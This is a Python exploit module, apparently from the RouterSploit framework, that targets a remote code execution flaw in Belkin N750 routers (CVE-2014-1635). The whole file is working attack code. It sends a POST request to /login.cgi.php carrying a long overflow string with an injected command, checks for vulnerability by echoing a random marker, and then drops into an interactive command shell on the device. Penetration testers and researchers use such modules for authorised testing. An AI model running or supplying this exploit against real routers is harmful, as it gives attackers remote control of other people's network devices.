from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin N750 RCE",
        "description": "Module exploits Belkin N750 Remote Code Execution vulnerability which allows executing commands on operation system level.",
        "authors": (
            "Marco Vaz <mv[at]integrity.pt>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1635",
            "https://www.exploit-db.com/exploits/35184/",
            "https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/",
        ),
        "devices": (
            "Belkin N750",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = "GO=&jump=" + "A" * 1379 + ";{};&ps=\n\n".format(cmd)

        response = self.http_request(
            method="POST",
            path="/login.cgi.php",
            headers=headers,
            data=data,
        )
        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
